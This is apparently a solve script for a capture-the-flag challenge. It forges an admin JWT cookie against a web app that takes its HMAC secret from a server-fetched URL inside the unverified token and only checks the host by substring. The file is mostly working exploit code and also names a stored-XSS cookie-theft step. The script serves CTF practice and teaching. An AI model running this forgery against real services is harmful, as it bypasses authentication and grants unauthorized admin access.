#!/usr/bin/env python3
# Enter the Polygon - Part 2 (flag2: the JWT forgery).
#
# The /admin view trusts a `jwtsess` cookie: it reads the unverified payload's
# "sig" field (a URL whose host must merely CONTAIN an approved signer string),
# fetches that URL server-side, and uses base64(content) as the HS256 secret to
# verify the token. If the token then decodes to {user: therock, role: admin}
# it returns the flag. The approved signers include `nginx` /
# `enterthepolygon.ctf.hackucf.org`, and w3.css is served at /static/w3.css,
# so we can compute the exact secret ourselves and forge an admin token.
#
# Part 1 (flag1 = SUN{why_bo0ther_with_ex1f}) is a stored-XSS / exif-polyglot
# cookie theft that needs an attacker-controlled collector plus the phantomjs
# victim bot, so it is not scripted here (see the report / README).
import os
import json
import base64
import hmac
import hashlib
import requests

BASE = os.environ.get("URL", "http://localhost:19303").rstrip("/")

# Where the *server* will fetch the signing material from. Its host only needs to
# contain an approved-signer substring. Locally the Django app reaches nginx by
# its compose service name; remotely the public hostname is itself approved.
if "localhost" in BASE or "127.0.0.1" in BASE:
    SIGN_HOST = "http://nginx/static/w3.css"
else:
    SIGN_HOST = BASE + "/static/w3.css"

# Compute the same secret the server computes: base64 of the w3.css bytes. We
# fetch the identical resource through the public endpoint.
content = requests.get(BASE + "/static/w3.css", timeout=10).content
secret = base64.b64encode(content)


def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")


def forge(filler):
    payload = {"sig": SIGN_HOST, "user": "therock", "role": "admin"}
    if filler:
        payload["z"] = "A" * filler
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing = h + b"." + p
    sig = hmac.new(secret, signing, hashlib.sha256).digest()
    return (signing + b"." + b64url(sig)).decode(), p.decode()


def server_can_read(seg):
    # Mirror the server's (standard, not urlsafe) payload b64decode so we only
    # ship a token whose payload it can parse.
    if "-" in seg or "_" in seg:
        return False
    try:
        raw = base64.b64decode(seg + "=" * (4 - len(seg) % 4))
        d = json.loads(raw)
        return d.get("user") == "therock" and d.get("role") == "admin"
    except Exception:
        return False


token = None
for f in range(0, 64):
    tok, seg = forge(f)
    if server_can_read(seg):
        token = tok
        break
assert token, "could not build a server-parseable payload"

r = requests.get(BASE + "/admin", cookies={"jwtsess": token}, timeout=10)
print(r.text)
